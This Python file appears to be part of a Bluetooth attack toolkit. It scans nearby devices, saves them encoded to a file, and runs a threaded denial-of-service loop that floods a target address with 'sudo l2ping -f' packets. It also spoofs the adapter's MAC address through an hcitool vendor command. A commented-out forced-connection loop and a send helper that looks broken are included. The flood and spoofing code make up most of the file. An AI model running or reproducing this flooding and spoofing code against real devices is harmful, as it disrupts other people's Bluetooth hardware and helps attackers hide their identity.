import asyncio
#import bluetooth
import threading
import json
import subprocess
from bleak import BleakScanner
from bleak import BleakClient
import static.python.rsacryptography as rsa

# SCAN FOR BLUETOOTH DEVICES
async def BluetoothScan():
    Devices = await BleakScanner.discover()
    return Devices

# CONVERT TO JSON
def BluetoothToJSON(devices):
  devicesJSON = []
  for device in devices:
    devicesJSON.append({
      "name": device.name,
      "address": device.address
    })
  devicesJSON = json.dumps(devicesJSON)
  encoded = rsa.encoder(devicesJSON)
  f = open("./static/python/devices", "w")
  f.write(str(encoded))
  f.close()
  return devicesJSON

# DOS ATTACK
stopDos = threading.Event()
def startDOS(BluetoothAddress):
  thread = threading.Thread(target=InfiniteBluetoothDoS, args=(BluetoothAddress))
  thread.start()
  return thread

def stopDOS(thread):
  stopDos.set()
  thread.join()

def InfiniteBluetoothDoS(BluetoothAddress):
  while not stopDos.is_set():
    try:
      subprocess.call(['sudo', 'l2ping', '-s', '512', '-t', '0', '-f', f"{BluetoothAddress}"])
    except Exception as e:
      print(f"[@] Error: {e}")

# SCAN FOR SERVICES ON BLUETOOTH DEVICE
# async def BluetoothServiceScanner(BluetoothAddress):
#   return bluetooth.find_service(address=BluetoothAddress)

# CHANGE MAC ADDRESS FOR SOME BLUETOOTH DEVICES ** LINUX ONLY
def SpoofingMacAddress(Interface, NewMac):
  try:
    Output = subprocess.check_output(['hciconfig', Interface])
    if b'No such device' in Output:
      print(f"[!] Error: Interface '{Interface}' not found")
      return
    PartList = NewMac.split(':')
    FinalMacAddress = ['0x' + PartList[5], '0x' + PartList[4], '0x' + PartList[3], '0x' + PartList[2], '0x' + PartList[1], '0x' + PartList[0]]
    #print(FinalMacAddress)
    subprocess.call(['sudo', 'hcitool', 'cmd', '0x3f', '0x001', FinalMacAddress[0], FinalMacAddress[1], FinalMacAddress[2], FinalMacAddress[3], FinalMacAddress[4], FinalMacAddress[5]])
    subprocess.call(['sudo', 'service', 'bluetooth', 'restart'])
    #print(f"[+] Successfully changed {Interface} MAC address to {NewMac}")
  except Exception as e:
    print(f"[!] Error: {e}")

# FORCE CONNECT TO BLUETOOTH DEVICE
# def BluetoothForceConnectService(BluetoothAddress, Port, Protocol):
#   while True:
#     try:
#       Socket = bluetooth.BluetoothSocket(Protocol)
#       Socket.connect((BluetoothAddress, int(Port)))
#       return Socket
#     except bluetooth.BluetoothError as e:
#       print(f"[!] Error: {e}")

# COMMUNICATE WITH BLUETOOTH DEVICE
def blComsReceive(Socket):
  return Socket.recv(1024)

def blComsSend(Socket, data):
  Socket.send(data.encrypt())

def deleteDevices():
  f = open("./static/python/devices", "w")
  f.write("")
  f.close()